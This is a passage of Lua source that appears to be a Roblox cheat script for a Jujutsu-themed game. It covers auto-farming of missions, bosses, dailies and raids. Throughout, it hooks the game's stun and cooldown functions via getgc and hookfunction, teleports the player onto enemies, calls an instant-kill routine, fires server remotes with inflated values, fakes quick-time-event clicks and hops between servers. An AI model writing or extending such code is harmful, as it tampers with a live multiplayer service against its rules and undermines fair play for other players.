	end
	table.sort(type8.NPCList)
end

if spears then
	IsCalamity = true
	IsBoss = false

	for _, v in ipairs(spears:GetChildren()) do
		if v:FindFirstChild("WeldToPart") then
			local p = v.WeldToPart
			p.CFrame = p.CFrame * CFrame.Angles(math.rad(90), 0, 0)

			local part = Instance.new("Part")
			part.Anchored = true
			part.CanCollide = true
			part.Size = Vector3.new(3, 3, 3)
			part.CFrame = p.CFrame * CFrame.new(30, 0, 30)
			part.Parent = p
		end
	end
end

for setting_name, setting_data in pairs(type8.SettingData) do
	local v = plr.ReplicatedData.settings:FindFirstChild(setting_name)

	if v and v.Value ~= setting_data then
		type8.Server.Data.ChangeSetting:InvokeServer(setting_name)
	end
end

if Workspace:GetAttribute("low") then
	function type8.Warp()
		if not IsActive(char) then return end

		local v = char.Humanoid.CombatAgent.Statuses:FindFirstChild("In Combat") or char.Humanoid.CombatAgent.Statuses:FindFirstChild("Skydiving")

		if v then
			return
		end

		if not HasCooldown("Warp") then
			AddCooldown("Warp", 1)
			SendKey("J")
		end
	end

	function type8.JujutsuHigh()
		if not IsActive(char) then return end

		local dist = (char.HumanoidRootPart.Position - Workspace.Map.JujutsuHigh.Parts.SpawnLocation.Position).Magnitude
		return dist <= 1700
	end
else
	for i, v in next, getgc(true) do
		if type(v) == "function" and islclosure(v) then
			local Name = debug.info(v, "n")
			if Name == "checkCooldown" then
				type8.checkCooldown = v
			end
			if Name == "handleCooldown" then
				type8.handleCooldown = v
			end
			if Name == "isStunned" then
				type8.isStunned = v
			end
			if Name == "hasStun" then
				type8.hasStun = v
			end
			if Name == "blockStunned" then
				type8.blockStunned = v
			end
			if Name == "setMissions" then
				type8.setMissions = v
			end
			if Name == "m1" then
				type8.m1 = v
			end
			if Name == "warp" then
				type8.Warp = v
			end
			if Name == "inJujutsuHigh" then
				type8.JujutsuHigh = v
			end
			if Name == "canWarp" then
				type8.canWarp = v
			end
		end
	end

	local old_1
	old_1 = hookfunction(type8.checkCooldown, LPH_NO_UPVALUES(function(...)
		if Library.Flags["Disables Stun"] then
			return true
		else
			return old_1(...)
		end
	end))

	local old_2
	old_2 = hookfunction(type8.handleCooldown, LPH_NO_UPVALUES(function(...)
		if Library.Flags["Disables Stun"] then
			return true
		else
			return old_2(...)
		end
	end))

	local old_3
	old_3 = hookfunction(type8.isStunned, LPH_NO_UPVALUES(function(...)
		if Library.Flags["Disables Stun"] then
			return nil
		else
			return old_3(...)
		end
	end))

	local old_4
	old_4 = hookfunction(type8.hasStun, LPH_NO_UPVALUES(function(...)
		if Library.Flags["Disables Stun"] then
			return nil
		else
			return old_4(...)
		end
	end))

	local old_5
	old_5 = hookfunction(type8.blockStunned, LPH_NO_UPVALUES(function(...)
		if Library.Flags["Disables Stun"] then
			return nil
		else
			return old_5(...)
		end
	end))
end

for daily_name, daily_data in pairs(type8.DailyData) do
	if daily_data then
		table.insert(type8.DailyList, {
			Name = daily_name,
			Level = daily_data,
			Display = string.format("%s [%s]", daily_name, daily_data)
		})
	end
end

table.sort(type8.DailyList, function(a, b)
	return (a.Level or 0) < (b.Level or 0)
end)

for _, daily in ipairs(type8.DailyList) do
	table.insert(type8.DailyDisplay, daily.Display)
end

for innate_name, innate_data in pairs(type8.InnateData) do
	if innate_data then
		table.insert(type8.InnateList, {
			Name = innate_name,
			Rarity = innate_data,
			Display = string.format("%s [%s]", innate_name, innate_data)
		})
	end
end

table.sort(type8.InnateList, function(a, b)
	return (type8.RarityData[a.Rarity] or 0) > (type8.RarityData[b.Rarity] or 0)
end)

for _, innate in ipairs(type8.InnateList) do
	table.insert(type8.InnateDisplay, innate.Display)
end

for _, inv_data in pairs(plr.ReplicatedData.inventory:GetChildren()) do
	if inv_data:IsA("NumberValue") then
		table.insert(type8.InventoryList, {
			Name = inv_data.Name,
			Amount = inv_data.Value,
		})
	end
end

table.sort(type8.InventoryList, function(a, b)
	return (a.Amount or 0) > (b.Amount or 0)
end)

for _, inv in ipairs(type8.InventoryList) do
	table.insert(type8.InventoryDisplay, inv.Name)
end

for item_name, item_data in pairs(type8.ItemData) do
	if item_data then
		table.insert(type8.ItemList, {
			Name = item_name,
			Rarity = item_data,
			Display = string.format("%s [%s]", item_name, item_data)
		})
	end
end

table.sort(type8.ItemList, function(a, b)
	return (type8.RarityData[a.Rarity] or 0) > (type8.RarityData[b.Rarity] or 0)
end)

for _, item in ipairs(type8.ItemList) do
	table.insert(type8.ItemDisplay, item.Display)
end

for material_name, material_data in pairs(type8.MaterialData) do
	if material_data then
		table.insert(type8.MaterialList, {
			Name = material_name,
			Rarity = material_data,
			Display = string.format("%s [%s]", material_name, material_data)
		})
	end
end

table.sort(type8.MaterialList, function(a, b)
	return (type8.RarityData[a.Rarity] or 0) > (type8.RarityData[b.Rarity] or 0)
end)

for _, material in ipairs(type8.MaterialList) do
	table.insert(type8.MaterialDisplay, material.Display)
end

for vial_name, vial_data in pairs(type8.VialData) do
	if vial_data then
		table.insert(type8.VialList, {
			Name = vial_name,
			Rarity = vial_data,
			Display = string.format("%s [%s]", vial_name, vial_data)
		})
	end
end

table.sort(type8.VialList, function(a, b)
	return (type8.RarityData[a.Rarity] or 0) > (type8.RarityData[b.Rarity] or 0)
end)

for _, vial in ipairs(type8.VialList) do
	table.insert(type8.VialDisplay, vial.Display)
end

for gourd_name, gourd_data in pairs(type8.GourdData) do
	if gourd_data then
		table.insert(type8.GourdList, {
			Name = gourd_name,
			Rarity = gourd_data,
			Display = string.format("%s [%s]", gourd_name, gourd_data)
		})
	end
end

table.sort(type8.GourdList, function(a, b)
	return (type8.RarityData[a.Rarity] or 0) > (type8.RarityData[b.Rarity] or 0)
end)

for _, gourd in ipairs(type8.GourdList) do
	table.insert(type8.GourdDisplay, gourd.Display)
end

for cat_name, cat_data in pairs(type8.CatData) do
	if cat_data then
		table.insert(type8.CatList, {
			Name = cat_name,
			Rarity = cat_data,
			Display = string.format("%s [%s]", cat_name, cat_data)
		})
	end
end

table.sort(type8.CatList, function(a, b)
	return (type8.RarityData[a.Rarity] or 0) > (type8.RarityData[b.Rarity] or 0)
end)

for _, cat in ipairs(type8.CatList) do
	table.insert(type8.CatDisplay, cat.Display)
end

for consumable_name, consumable_data in pairs(type8.ConsumableData) do
	if consumable_data then
		table.insert(type8.ConsumableList, {
			Name = consumable_name,
			Rarity = consumable_data,
			Display = string.format("%s [%s]", consumable_name, consumable_data)
		})
	end
end

table.sort(type8.ConsumableList, function(a, b)
	return (type8.RarityData[a.Rarity] or 0) > (type8.RarityData[b.Rarity] or 0)
end)

for _, consumable in ipairs(type8.ConsumableList) do
	table.insert(type8.ConsumableDisplay, consumable.Display)
end

for calamity_name, calamity_data in pairs(type8.CalamityData) do
	if calamity_data then
		table.insert(type8.CalamityList, {
			Name = calamity_name,
			Rarity = calamity_data,
			Display = string.format("%s [%s]", calamity_name, calamity_data)
		})
	end
end

table.sort(type8.CalamityList, function(a, b)
	return (type8.RarityData[a.Rarity] or 0) > (type8.RarityData[b.Rarity] or 0)
end)

for _, calamity in ipairs(type8.CalamityList) do
	table.insert(type8.CalamityDisplay, calamity.Display)
end

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

function type8.Nearest()
	if Library.Flags["God Mode"] and not char:FindFirstChild("ForceField") then return end

	if not mob or not IsActive(mob) then
		mob = GetMob(nil, Library.Flags["Range to Detect"])
	end

	if mob and IsActive(mob) then
		local h, r = mob.Humanoid, mob.HumanoidRootPart

		repeat wait(0.3)
			TP(r.CFrame * CFrame.new(0, 0, 3))
			type8.M1(h)
			InstantKill(r, h)
		until not Library.Flags["Auto Farm Nearest"] or not IsActive(mob) or (Library.Flags["God Mode"] and not char:FindFirstChild("ForceField"))
	end
end

function type8.World()
	if not mob or not IsActive(mob) then
		mob = GetMob(type8.WorldSelect)
	end

	if mob and IsActive(mob) then
		if type8.JujutsuHigh() then
			type8.Warp(type8)
		else
			local h, r = mob.Humanoid, mob.HumanoidRootPart

			repeat wait()
				TP(r.CFrame * CFrame.new(0, 0, 3))					
				type8.M1(h)
				type8.M2(2)
				type8.Skill()
				InstantKill(r, h)
			until not Library.Flags["Auto Farm World"] or not IsActive(mob)
		end
	else
		if Library.Flags["Hop when no World"] then
			Hop(Library.Flags["Select Method to Hop"])
			wait(3)
		end
	end
end

function type8.Mission()
	if Library.Flags["God Mode"] and not char:FindFirstChild("ForceField") then return end

	if not PlayerGUI:FindFirstChild("QuestMarker") then
		if type8.JujutsuHigh() then
			local mission = GetMission() or "Shijo Town Set"

			TP(Workspace.Objects.Portals.Missions.CFrame)
			wait(0.01)
			for _, v in pairs(ReplicatedStorage.Missions[plr.Name][mission]:GetChildren()) do
				if v:FindFirstChild("type") then
					if v.type.Value == "Band" or v.type.Value == "Exorcise" then
						type8.Server.Data.ClaimQuest:InvokeServer(v)						
					else
						type8.Server.Data.RerollMissions:InvokeServer(v.Parent.Name)
					end
					break
				end
			end
		else
			if not mob or not mob.Parent and GetQuestMaker() == nil then
				type8.Warp(type8)
				wait(0.01)
			end
		end
	else
		if type8.JujutsuHigh() then
			type8.Warp(type8)
			wait(0.01)
		else
			if not mob or not IsActive(mob) then
				mob = GetQuestMaker()
			end

			if mob and IsActive(mob) then
				local h, r = mob.Humanoid, mob.HumanoidRootPart

				repeat wait(0.3)
					TP(r.CFrame * CFrame.new(0, 0, 3))
					type8.M1(h)
					InstantKill(r, h)
				until not Library.Flags["Auto Farm Mission"] or not IsActive(mob) or (Library.Flags["God Mode"] and not char:FindFirstChild("ForceField"))
			end
		end
	end
end

function type8.Storyline()
	if not GetQuestName() then
		for story_name, story_data in pairs(type8.StoryData) do
			if PlayerGUI.StorylineMarker.TextLabel.Text:gsub("\n", " ") == story_name then

				local npc = Workspace.Objects.NPCs[story_data[1]].HumanoidRootPart
				if npc then
					TP(npc.CFrame)
					wait(0.3)
					type8.Server.Dialogue.GetResponse:InvokeServer(story_data[2], story_data[3])
					wait(0.3)
					break
				end
			end
		end
	else
		local quest_maker = FindPath(PlayerGUI, "QuestMarker", "Frame")
		local quest_data = quest_maker and quest_maker.Parent.Adornee.Parent

		if quest_maker and quest_data then
			if quest_data.Name == "MissionItems" then
				local item = Workspace.Objects.MissionItems:FindFirstChildWhichIsA("BasePart")
				local pick = item and item:FindFirstChildOfClass("ProximityPrompt")

				if item and pick then
					TP(item.CFrame)
					wait(0.3)
					ProximityPrompt(pick)
					wait(0.3)
				end

			elseif quest_data.Parent.Name == "Mobs" then
				if not mob or not IsActive(mob) then
					mob = GetQuestMaker()
				end

				if mob and IsActive(mob) then
					local h, r = mob.Humanoid, mob.HumanoidRootPart

					repeat wait(0.5)
						TP(r.CFrame * CFrame.new(0, 0, 3))
						type8.M1(h)
						InstantKill(r, h)
					until not Library.Flags["Auto Farm Storyline"] or not IsActive(mob) or (Library.Flags["God Mode"] and not char:FindFirstChild("ForceField"))
				end

			elseif quest_data.Name == "Towns" then
				local part = quest_maker.Parent.Adornee

				if part then
					TP(part.CFrame)
					wait(0.3)
				end

			elseif quest_data.Parent.Name == "NPCs" then
				local npc = quest_data:FindFirstChild("HumanoidRootPart")
				local pick = npc and npc.Parent:FindFirstChildOfClass("ProximityPrompt")

				if npc then
					TP(npc.CFrame)
					wait(0.3)
					ProximityPrompt(pick)
					wait(0.3)
				end

				if PlayerGUI.Dialogue.Enabled then
					local button = PlayerGUI.Dialogue.Frame.Options:FindFirstChild("DialogueOption")

					if button then
						ClickGui(button)
					else
						ClickGui(PlayerGUI.Dialogue.Frame)
					end
				end

			elseif quest_data.Name == "MainQuests" then
				local part = quest_maker.Parent.Adornee

				if part then
					TP(part.CFrame)
					wait(0.3)
				end

			elseif quest_data.Name == "Portals" then
				local part = quest_maker.Parent.Adornee
				local enter = part and part:FindFirstChildOfClass("ProximityPrompt")

				if part then
					TP(part.CFrame)
					wait(0.3)
					ProximityPrompt(enter)
					wait(0.3)
				end

				if PlayerGUI.RaidsRift.Enabled then
					ClickGui(PlayerGUI.RaidsRift.Frame.Start)
				end

			elseif quest_data.Parent.Name == "MovableRocks" then
				local part = quest_data:FindFirstChild("Rock")
				local pick = quest_data and quest_data:FindFirstChild("Prompt") and quest_data.Prompt:FindFirstChildOfClass("ProximityPrompt")

				if part and pick then
					TP(part.CFrame)
					wait(0.3)
					ProximityPrompt(pick)
					wait(0.3)
				end

				for _, v in ipairs(PlayerGUI:GetChildren()) do
					if v.Name == "QuestMarker"
						and v:FindFirstChild("Frame")
						and v:FindFirstChild("TextLabel")
						and v.TextLabel.Text == "Move Here" then
						TP(v.Frame.Parent.Adornee.Parent.Final.CFrame)
						wait(0.3)
					end
				end

			elseif quest_data.Name == "MistClear" then 
				local npc = Workspace.Map.Parts.MistClear.Civilian.HumanoidRootPart
				local pick = npc and npc.Parent:FindFirstChildOfClass("ProximityPrompt")

				if npc and pick then
					TP(npc.CFrame)
					wait(0.3)
					ProximityPrompt(pick)
					wait(0.3)
				end

			elseif quest_data.Parent.Name == "MissionItems" then
				local npc = quest_data:FindFirstChild("HumanoidRootPart")
				local pick = npc and npc.Parent:FindFirstChildOfClass("ProximityPrompt")

				if npc then
					TP(npc.CFrame)
					wait(0.3)
					ProximityPrompt(pick)
					wait(0.3)
				end

				for _, v in ipairs(PlayerGUI:GetChildren()) do
					if v.Name == "QuestMarker"
						and v:FindFirstChild("Frame")
						and v:FindFirstChild("TextLabel")
						and v.TextLabel.Text == "Destination" then
						TP(v.Frame.Parent.Adornee.CFrame)
						wait(0.3)
					end
				end

			elseif quest_data.Name == "SECPortals" then
				local part = quest_maker.Parent.Adornee
				local enter = part and part:FindFirstChildOfClass("ProximityPrompt")

				if part then
					TP(part.CFrame)
					wait(0.3)
					ProximityPrompt(enter)
					wait(3.6)
					for _, v in ipairs(Workspace.Objects.Mobs:GetChildren()) do
						if IsActive(v) 
							and (char.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude <= 300  then
							v.Humanoid.Health = 0
						end
					end
					wait(0.3)
				end
			end

		elseif GetQuestName() == "SG_Q3_SpearFromHeaven" then
			if GetResponse() == "WATCH OUT! It's casting a hollow purple, RUN!" then
				local part = FindPath(Workspace.Objects.Effects, "SECQuestObby", "FinishLine")

				if part then
					TP(part)
				end
			end

		else
			if not mob or not IsActive(mob) then
				mob = GetMob()
			end

			if mob and IsActive(mob) then
				local h, r = mob.Humanoid, mob.HumanoidRootPart

				repeat wait(0.5)
					TP(r.CFrame * CFrame.new(0, 0, 3))
					type8.M1(h)
					InstantKill(r, h)
				until not Library.Flags["Auto Farm Storyline"] or not IsActive(mob) or (Library.Flags["God Mode"] and not char:FindFirstChild("ForceField"))
			end
		end
	end
end

function type8.Daily()
	if Library.Flags["God Mode"] and not char:FindFirstChild("ForceField") then return end

	if type8.JujutsuHigh() then
		type8.Warp(type8)
	else
		if not PlayerGUI:FindFirstChild("QuestMarker") then
			wait(3)
			for _, v in ipairs(type8.DailyList) do
				if table.find(type8.DailySelect, v.Name) and IsDaily(v.Name) and plr.ReplicatedData.level.Value >= v.Level then
					wait(3)

					local npc = Workspace.Objects.NPCs[v.Name].HumanoidRootPart
					if npc then
						TP(npc.CFrame)
						wait(3)
						type8.Server.Dialogue.GetResponse:InvokeServer(v.Name, "Start")
						wait(3)
						type8.Server.Dialogue.GetResponse:InvokeServer(v.Name, "Accept")
						wait(3)
						AddCooldown(v.Name, 1234)
					end
					break
				end
			end
		else
			local quest = GetQuestName()

			if quest == "Cabbage Fiasco" or quest == "Distorted Tree" then
				local item = Workspace.Objects.MissionItems:FindFirstChild(plr.Name)
				local destination = FindPath(Workspace, "Objects", "MissionItems", "Part")
				local pick = item and item:FindFirstChildOfClass("ProximityPrompt")

				if item and destination and pick then
					TP(item.CFrame)
					wait(0.3)
					ProximityPrompt(pick)
					wait(0.3)
					TP(destination.CFrame)
					wait(0.3)
					return
				end

			elseif quest == "Temple Cleansing" then
				local item = Workspace.Objects.MissionItems:FindFirstChild(plr.Name)
				local pick = item and item:FindFirstChildOfClass("ProximityPrompt")

				if item and pick then
					TP(item.CFrame)
					wait(0.3)
					ProximityPrompt(pick)
					wait(0.3)
					return
				end

			elseif quest == "Snow Clearing Quest" then
				for _, v in pairs(Workspace.Map.QuestObject.SnowPiles.Used:GetChildren()) do
					if v.Name == "SnowPile" then
						local pick = v and v:FindFirstChildOfClass("ProximityPrompt")

						if v:IsA("BasePart") and pick then
							TP(v.CFrame)
							wait(0.3)
							ProximityPrompt(pick)
							wait(0.3)
							break
						end
					end
				end
				return

			elseif quest == "Frost Petal Quest" then
				for _, v in pairs(Workspace.Map.ForageSpots:GetChildren()) do
					if v.Name == "Frost Petal" then
						local cylinder = FindPath(v, "Frost Petal", "Cylinder")
						local pick = cylinder and cylinder:FindFirstChildOfClass("ProximityPrompt")

						if cylinder and pick then
							TP(cylinder.CFrame)
							wait(0.3)
							ProximityPrompt(pick)
							wait(0.3)
							break
						end
					end
				end
				return
			end

			if not mob or not IsActive(mob) then
				mob = GetQuestMaker()
			end

			if mob and IsActive(mob) then
				local h, r = mob.Humanoid, mob.HumanoidRootPart

				repeat wait(0.3)
					TP(r.CFrame * CFrame.new(0, 0, 3))
					type8.M1(h)
					InstantKill(r, h)
				until not Library.Flags["Auto Farm Daily"] or not IsActive(mob) or (Library.Flags["God Mode"] and not char:FindFirstChild("ForceField"))
			end
		end
	end
end

function type8.Boss()
	if Library.Flags["God Mode"] and not char:FindFirstChild("ForceField") then return end

	local location = Workspace.Objects.Spawns:FindFirstChild("BossSpawn")

	if not mob or not IsActive(mob) then
		mob = GetMob()
	end

	if mob and IsActive(mob) then
		local h, r = mob.Humanoid, mob.HumanoidRootPart

		repeat wait()
			TP(r.CFrame * CFrame.new(0, 0, 3))					
			type8.M1(h)
			type8.M2(2)
			type8.Skill()
			InstantKill(r, h)
		until not Library.Flags["Auto Farm Boss"] or not IsActive(mob) or (Library.Flags["God Mode"] and not char:FindFirstChild("ForceField"))
	else
		type8.Server.Combat.ToggleMenu:FireServer(false)
		wait(0.3)
		TP(location.CFrame)
		wait(0.3)
	end
end

function type8.Investigation()
	if Library.Flags["God Mode"] and not char:FindFirstChild("ForceField") then return end

	local location = Workspace.Map.Parts:FindFirstChild("SpawnLocation")
	local mission = Workspace.Objects:FindFirstChild("MissionItems")

	if type8.Skip and type8.Skip.Visible then
		ClickGui(type8.Skip)
	end

	if mission:FindFirstChildWhichIsA("BasePart") then
		for _, v in ipairs(mission:GetChildren()) do
			local pick = v and v:FindFirstChildOfClass("ProximityPrompt")

			if v:IsA("BasePart") and pick then
				TP(v.CFrame)
				wait(0.1)
				ProximityPrompt(pick)
				wait(0.1)
				break
			end
		end
		return

	elseif mission:FindFirstChildWhichIsA("Model") then
		for _, v in ipairs(mission:GetChildren()) do
			local pick = v and v:FindFirstChildOfClass("ProximityPrompt")

			if IsActive(v) and pick then
				TP(v.HumanoidRootPart.CFrame)
				wait(0.1)
				ProximityPrompt(pick)
				wait(0.1)
				TP(location.CFrame)
				wait(0.1)
				break
			end
		end
		return

	elseif Workspace.Objects.Mobs:FindFirstChildWhichIsA("Model") then
		if not mob or not IsActive(mob) then
			mob = GetQuestMaker()
		end

		if mob and IsActive(mob) then
			local h, r = mob.Humanoid, mob.HumanoidRootPart

			repeat wait(0.03)
				TP(r.CFrame * CFrame.new(0, 0, 3))
				type8.M1(h)
				InstantKill(r, h)
			until not Library.Flags["Auto Farm Investigation"] or not IsActive(mob) or (Library.Flags["God Mode"] and not char:FindFirstChild("ForceField"))
		else
			type8.Server.Combat.ToggleMenu:FireServer(false)
			wait(0.3)
			TP(location.CFrame)
			wait(0.3)
		end
	end
end

function type8.Calamity()
	if Library.Flags["God Mode"] and not char:FindFirstChild("ForceField") then return end

	local location = Workspace.Map.Parts:FindFirstChild("SpawnLocation")

	if not mob or not IsActive(mob) then
		mob = GetMob()
	end

	if mob and IsActive(mob) then
		if not mob.Humanoid.CombatAgent.Statuses:FindFirstChild("Iframes") then
			local h, r = mob.Humanoid, mob.HumanoidRootPart

			repeat wait()
				TP(r.CFrame * CFrame.new(0, 0, 3))
				type8.M1(h)
				type8.M2(2)
				type8.Skill()
				InstantKill(r, h)
			until not Library.Flags["Auto Farm Calamity"] or not IsActive(mob) or (Library.Flags["God Mode"] and not char:FindFirstChild("ForceField")) or mob.Humanoid.CombatAgent.Statuses:FindFirstChild("Iframes")
			return
		end
	else
		type8.Server.Combat.ToggleMenu:FireServer(false)
		wait(0.3)
		TP(location.CFrame)
		wait(0.3)
	end

	local charge_meter = IsChargeMeter()
	if charge_meter then
		TP(charge_meter.WeldToPart.Part.CFrame * CFrame.new(0, 0, 3))
		wait(3)
		return
	end

	for _, v in ipairs(Workspace.Objects.Destructibles:GetChildren()) do
		if v.Name == "SEC Cocoon"
			and v:FindFirstChild("RootPart") then
			if not v.RootPart.DestructibleAgent.Dead.Value then
				TP(v.RootPart.CFrame * CFrame.new(0, 0, 3))
				type8.M1()
				type8.M2(2)
				type8.Skill()
				return
			end
		end
	end

	if not IsEnery(enery) then
		for _, v in ipairs(Workspace.Objects.Effects:GetChildren()) do
			if v.Name == "SECEnergyCharge" and IsEnery(v) then
				enery = v
			end
		end
	end

	if IsEnery(enery) then
		if not enery.BillboardGui.X.Visible then
			TP(enery.CFrame * CFrame.new(0, 0, 3))
		else
			if CheckTool("Infinity Shard") then
				TP(enery.CFrame * CFrame.new(0, 0, 3))
				wait(0.3)
				type8.Server.Combat.Skill:FireServer("Drop Shard")
			else
				if not IsCrystal(crystal) then
					for _, v in ipairs(Workspace.Objects.Destructibles:GetChildren()) do
						if v.Name == "SEC Infinity Crystal" and IsCrystal(v) then
							crystal = v
						end
					end
				end

				if IsCrystal(crystal) then
					TP(crystal.RootPart.CFrame * CFrame.new(0, 0, 3))
					type8.M1()
					wait(0.3)
				end
			end
		end
	end
end

function type8.Join()
	if HasCooldown("Auto Join") then return end

	if IsWorld then
		TeleportService:Teleport(type8.ModeData[Library.Flags["Select Mode to Join"]])
		return
	elseif IsLobbyBoss or IsLobbyInvestigation or IsLobbyCalamity then
		local mode = (IsLobbyBoss or IsLobbyCalamity) and "Boss" or IsInvestigation and "Investigation"
		local map = Library.Flags["Select Map to Join"] or IsLobbyCalamity and "Six Eyed Calamity"
		local level = IsLobbyCalamity and 1 or tonumber(Library.Flags["Select Level to Join"])
		local difficulty = Library.Flags["Select Difficulty to Join"]

		type8.Server.Raids.CreateLobby:InvokeServer(mode, map, level, difficulty, "solixhub")
		task.wait(0.3)
		type8.Server.Raids.StartLobby:InvokeServer((IsLobbyBoss or IsLobbyCalamity) and "Boss")
		task.wait(0.3)
	end

	AddCooldown("Auto Join", 36)
end

function type8.GodMode()
	if not PlayerGUI.Main.Enabled then return end
	if char:FindFirstChild("ForceField") then return end

	if IsCalamity or IsExchangeEvent then
		plr:Kick("I already said it couldn't be used here.")
	end

	type8.Skill:FireServer("Judo Throw")
	type8.Server.Combat.ToggleMenu:FireServer(true)
end

function type8.BlackFlash()
	if HasCooldown("Black Flash") then return end

	AddCooldown("Black Flash", 1)
	type8.Server.Combat.ApplyBlackFlashToNextHitbox:FireServer(9e9)
end

function type8.Chest()
	if PlayerGUI.Loot.Enabled then
		if PlayerGUI.Loot.Results.Visible then
			ClickGui(PlayerGUI.Loot.Results.Main.Continue)
			wait(0.3)
		end
	else
		local chest = GetChest()

		if chest then
			if Library.Flags["Chest Use Only"] then
				type8.UseItem()
				wait(0.3)
			end

			ProximityPrompt(chest)
		end
	end
end

function type8.DomainClash()
	local domain_clash = PlayerGUI.Main.Frame.BottomMiddle.DomainClash  

	if domain_clash and domain_clash.Visible then
		local area = domain_clash.Timing.Frame:FindFirstChild("Area")
		local crit = area and area:FindFirstChild("Crit")

		if area and crit then
			area.Size = UDim2.new(1, 0, 1, 0)
			area.Position = UDim2.new(0.5, 0, area.Position.Y.Scale, 0)
			crit.Position = UDim2.new(0.5, 0, crit.Position.Y.Scale, 0)
			crit.Size = UDim2.new(1, 0, 1, 0)

			VirtualInputManager:SendMouseButtonEvent(500, 500, 0, true, nil, 0)
			wait(0.01)
			VirtualInputManager:SendMouseButtonEvent(500, 500, 0, false, nil, 0)
		end
	end

	local qte = PlayerGUI.Main.Frame.BottomMiddle.QTE

	if qte and qte.Visible then
		local area = qte.Timing.Frame:FindFirstChild("Area")
		local crit = area and area:FindFirstChild("Crit")

		if area and crit then
			area.Size = UDim2.new(1, 0, 1, 0)
			area.Position = UDim2.new(0.5, 0, area.Position.Y.Scale, 0)
			crit.Position = UDim2.new(0.5, 0, crit.Position.Y.Scale, 0)
			crit.Size = UDim2.new(1, 0, 1, 0)

			VirtualInputManager:SendMouseButtonEvent(500, 500, 0, true, nil, 0)
			wait(0.01)
			VirtualInputManager:SendMouseButtonEvent(500, 500, 0, false, nil, 0)
		end
	end
end

function type8.Promote()
	local current_grade

	for grade_index, grade_data in ipairs(type8.GradeData) do
		if grade_data[1] == plr.ReplicatedData.grade.Value then
			current_grade = grade_index
			break
		end
	end

	if current_grade and current_grade < #type8.GradeData then
		local next_grade = type8.GradeData[current_grade + 1]

		if plr.ReplicatedData.level.Value >= next_grade[2]
			and plr.ReplicatedData.cash.Value >= next_grade[3]
			and plr.ReplicatedData.inventory:FindFirstChild("Mission Essence").Value >= next_grade[4] then
			type8.Server.Dialogue.GetResponse:InvokeServer("Clan Head Jujutsu High", "Promote")
		end
	end
end

function type8.CollectItem()
	local item = nil

	if not item or not IsObject(item) then
		for _, v in ipairs(Workspace.Objects.Drops:GetChildren()) do
			if IsObject(v)
				and table.find(type8.ItemSelect, v.Name) then
				item = v
				break
			end
		end
	end

	if IsObject(item) then
		if type8.JujutsuHigh() then
			type8.Warp(type8)
			return
		end

		local part = item and item:FindFirstChildWhichIsA("BasePart")
		local pick = item and item:FindFirstChildOfClass("ProximityPrompt")

		if part and pick then
			TP(part.CFrame)
			wait(0.1)
			ProximityPrompt(pick)
			wait(0.1)
			if Library.Flags["Auto Send Webhook Item"] then
				SendWebhook(Library.Flags["Webhook URL Item"], Library.Flags["Mention Option Item"], "Auto Collect Item", item.Name)
			end
		end
	else
		if Library.Flags["Hop when no Item"] then
			Hop(Library.Flags["Select Method to Hop"])
			wait(3)
		end
	end
end

function type8.Material()
	local material = nil

	if not material or not IsMaterial(material) then
		for _, v in ipairs(Workspace.Map.ForageSpots:GetChildren()) do
			if table.find(type8.MaterialSelect, v.Name) and IsMaterial(v) then
				material = v
				break
			end
		end
	end

	if material and IsMaterial(material) then
		if type8.JujutsuHigh() then
			type8.Warp(type8)
			return
		end

		if material.Name == "Cursebloom" then
			local part = material:FindFirstChildWhichIsA("BasePart")
			local pick = part and part:FindFirstChildOfClass("ProximityPrompt")

			if part and pick then
				TP(part.CFrame)
				wait(0.1)
				ProximityPrompt(pick)
				wait(0.1)
			end
		else
			local v = material:FindFirstChildOfClass("Model")
			local part = v and v:FindFirstChildWhichIsA("BasePart")
			local pick = part and part:FindFirstChildOfClass("ProximityPrompt")

			if v and part and pick then
				TP(part.CFrame)
				wait(0.1)
				ProximityPrompt(pick)
				wait(0.1)
			end
		end
	end
end

function type8.CashMarket()
	for _, v in ipairs(ReplicatedStorage.CashMarket:GetChildren()) do
		local item_value = v.Value:split("|")
		local cost = tonumber(item_value[1])
		local name = tostring(item_value[2])
		local total = tonumber(item_value[3])

		if table.find(type8.CashMarketSelect, name) then

			local item_player = plr.ReplicatedData.dailyCashMarketLimits:FindFirstChild(name)
			if item_player then
				local purchased = item_player:FindFirstChild("1")
				if purchased and purchased.Value >= total then return end
			end

			if plr.ReplicatedData.cash.Value < cost then return end

			type8.Server.Data.MarketExchange:InvokeServer(v)

			if Library.Flags["Auto Send Webhook Cash Market"] then
				SendWebhook(Library.Flags["Webhook URL Cash Market"], Library.Flags["Mention Option Cash Market"], "Auto Cash Market", name)
			end
		end
	end
end

function type8.UseItem()
	if #type8.VialSelect > 0 then
		for _, v in ipairs(type8.VialSelect) do
			local vial = plr.ReplicatedData.inventory:FindFirstChild(v)

			if vial and vial.Value > 0 then
				if v == "Health Vial" then
					if char.Humanoid.Health / char.Humanoid.MaxHealth >= 0.9 then
						type8.Server.Data.EquipItem:InvokeServer(v)
					end
				end

				if not char.Humanoid.CombatAgent.Statuses:FindFirstChild(v:gsub(" ", "")) then
					type8.Server.Data.EquipItem:InvokeServer(v)
				end
			end
		end
	end

	if #type8.GourdSelect > 0 then
		for _, v in ipairs(type8.GourdSelect) do
			local gourd = plr.ReplicatedData.inventory:FindFirstChild(v)

			if gourd and gourd.Value > 0 then
				if not char.Humanoid.CombatAgent.Statuses:FindFirstChild(v:gsub(" ", "")) then
					type8.Server.Data.EquipItem:InvokeServer(v)
				end
			end
		end
	end

	if #type8.CatSelect > 0 then
		for _, v in ipairs(type8.CatSelect) do
			local cat = plr.ReplicatedData.inventory:FindFirstChild(v)

			if cat and cat.Value > 0 then
				if plr.ReplicatedData.luckBoost.duration.Value == 0 then
					type8.Server.Data.EquipItem:InvokeServer(v)
				end
			end
		end
	end

	if #type8.ConsumableSelect > 0 then
		for _, v in ipairs(type8.ConsumableSelect) do
			local consumable = plr.ReplicatedData.inventory:FindFirstChild(v)

			if consumable and consumable.Value > 0 then
				if v == "Dorayaki" then
					if plr.ReplicatedData.consumableexpBoost.Value == 0 then
						type8.Server.Data.EquipItem:InvokeServer(v)
					end
				end

				if v == "Takoyaki" then
					if plr.ReplicatedData.consumablemasteryBoost.Value == 0 then
						type8.Server.Data.EquipItem:InvokeServer(v)
					end
				end

				if string.find(v, "Lotus") then
					if plr.ReplicatedData.chestOverride.Value == 0 then
						type8.Server.Data.EquipItem:InvokeServer(v)
					end
				end
			end
		end
	end

	if #type8.CalamitySelect > 0 then
		for _, v in ipairs(type8.CalamitySelect) do
